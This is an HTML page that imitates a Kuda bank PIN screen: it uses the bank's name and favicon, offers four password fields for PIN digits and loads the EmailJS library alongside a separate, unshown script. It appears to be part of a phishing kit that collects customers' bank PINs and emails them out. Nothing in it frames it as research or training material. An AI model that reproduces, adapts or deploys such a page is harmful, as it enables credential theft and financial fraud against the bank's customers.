<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="icon"
      href="https://kuda.com/icons/icon-48x48.png?v=817086b560dfc1021d60b8ab9b66d485"
      type="image/svg+xml"
    />
    <link
      rel="icon"
      href="https://kuda.com/icons/icon-48x48.png?v=817086b560dfc1021d60b8ab9b66d485"
      type="image/png"
    />
    <title>Kuda bank</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link rel="stylesheet" href="pin.css" />
  </head>
  <body>
    <div class="container">
      <div class="contentSec">
        <div class="title">Enter PIN to continue</div>
      </div>
      <div class="formSec">
        <div class="input">
          <form method="post">
            <input
              type="password"
              id="digit1"
              class="pin-input"
              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
              inputmode="numeric"
              pattern="[0-9]*"
              required
            />
            <input
              type="password"
              id="digit2"
              class="pin-input"
              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
              inputmode="numeric"
              pattern="[0-9]*"
              required
            />
            <input
              type="password"
              id="digit3"
              class="pin-input"
              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
              inputmode="numeric"
              pattern="[0-9]*"
              required
            />
            <input
              type="password"
              id="digit4"
              class="pin-input"
              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
              inputmode="numeric"
              pattern="[0-9]*"
              required
            />
          </form>
        </div>

        <div class="buttonSec">
          <button id="submitBtn" type="submit">Next</button>
        </div>
      </div>
    </div>

    <!-- Add this to the head of your HTML file -->
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script src="pin.script.js"></script>
  </body>
</html>
